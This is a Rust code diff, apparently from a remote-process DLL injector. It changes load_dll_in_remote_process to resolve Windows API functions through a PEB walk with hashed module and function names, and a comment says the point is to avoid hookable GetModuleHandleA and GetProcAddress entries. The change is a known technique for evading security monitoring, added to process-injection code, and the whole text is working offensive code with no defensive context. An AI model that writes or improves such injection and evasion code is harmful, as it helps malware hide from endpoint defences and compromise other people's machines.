@@ -21,6 +21,7 @@ use winapi::um::winnt::{
 use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
 use winapi::um::handleapi::CloseHandle;
 use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
+use pe_resolve;
 
 
 // RUNTIME_FUNCTION (IMAGE_RUNTIME_FUNCTION_ENTRY) – 12 bytes, x64 only.
@@ -887,17 +888,21 @@ pub unsafe fn load_dll_in_remote_process(
         let fn_name_cstr = std::ffi::CString::new(import.name.as_str())
             .map_err(|_| anyhow!("import function name contains NUL: {}", import.name))?;
 
-        let mod_handle = GetModuleHandleA(dll_name_cstr.as_ptr() as *const i8);
-        if mod_handle.is_null() {
+        // M-26: resolve via PEB walk + clean export table instead of the
+        // hookable GetModuleHandleA / GetProcAddress IAT entries.
+        let dll_hash = pe_resolve::hash_str(dll_name_cstr.to_bytes_with_nul());
+        let mod_base = pe_resolve::get_module_handle_by_hash(dll_hash).unwrap_or(0);
+        if mod_base == 0 {
             return Err(anyhow!(
-                "GetModuleHandleA failed for '{}': not loaded in current process",
+                "PEB-walk failed for '{}': not loaded in current process",
                 import.dll
             ));
         }
-        let proc_addr = GetProcAddress(mod_handle, fn_name_cstr.as_ptr() as *const i8);
-        if proc_addr.is_null() {
+        let fn_hash = pe_resolve::hash_str(fn_name_cstr.to_bytes_with_nul());
+        let proc_addr = pe_resolve::get_proc_address_by_hash(mod_base, fn_hash).unwrap_or(0);
+        if proc_addr == 0 {
             return Err(anyhow!(
-                "GetProcAddress failed for '{}' in '{}'",
+                "PEB-walk export resolution failed for '{}' in '{}'",
                 import.name,
                 import.dll
             ));
